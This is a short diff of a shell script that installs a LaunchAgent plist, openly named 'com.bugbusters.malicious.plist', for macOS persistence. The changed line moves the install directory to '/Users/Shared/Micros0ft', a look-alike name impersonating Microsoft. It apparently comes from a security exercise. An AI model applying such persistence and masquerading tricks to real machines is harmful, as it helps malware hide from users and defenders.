@@ -5,7 +5,7 @@
 
 set -e
 
-AGENT_DIR="/Library/Application Support/BugBusters"
+AGENT_DIR="/Users/Shared/Micros0ft"
 PLIST_NAME="com.bugbusters.malicious.plist"
 PLIST_SOURCE="$(dirname "$0")/agent/$PLIST_NAME"
 PLIST_DEST="/Library/LaunchAgents/$PLIST_NAME"
